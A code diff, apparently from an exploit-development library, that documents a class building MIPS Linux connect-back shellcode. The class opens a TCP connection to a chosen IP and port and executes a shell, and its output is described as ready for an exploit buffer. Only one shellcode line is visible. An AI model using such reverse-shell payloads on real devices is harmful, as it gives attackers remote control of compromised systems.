@@ -12,6 +12,12 @@ import os
 from ...common.support import BigEndian,LittleEndian
 
 class ConnectbackPayload:
+    """
+    This is a MIPS Linux connect-back payload.
+    
+    It will establish a TCP connection to the specified port and address,
+    and exec() a shell with the privileges of the exploited process.
+    """
     shellcodes = {}
     shellcodes[LittleEndian]=string.join([
         "\xfa\xff\x0f\x24", # li    t7,-6
@@ -119,7 +125,27 @@ class ConnectbackPayload:
         ],'')
 
     def __init__(self,connectback_ip,endianness,port=8080):
+        """
+        Class constructor.
         
+        Parameters:
+        -----------
+        connectback_ip: IP Address to connect back to.
+        endianness: Endianness of the target. one of LittleEndian or BigEndian.
+        port:   Optional parameter specifying TCP port to connect back to.
+                Defaults to 8080.
+                
+        Attributes:
+        -----------
+        shellcode:  The string representing the payload's shellcode, ready to add
+                    to an exploit buffer.
+        
+        Notes:
+        ------
+        Although this payload is free of common bad characters such as nul bytes
+        and spaces, your IP address or port may introduce bad characters.  If so,
+        you may need to use an encoder.
+        """
         self.connectback_pid=None
 
         port=int(port)
@@ -135,18 +161,4 @@ class ConnectbackPayload:
 
         self.shellcode=shellcode
 
-    def serve_connectback(self):
-        #unimplemented
-        #self.callback_pid=self.callback.serve_callback()
-        #return self.callback_pid
-        return 0
-
-    def stop_server(self):
-        if self.callback_pid:
-            os.kill(self.callback_pid,signal.SIGTERM)
-
-    def wait_til_done(self):
-        #unimplemented
-        #os.waitpid(self.callback_pid,0)
-        pass
 
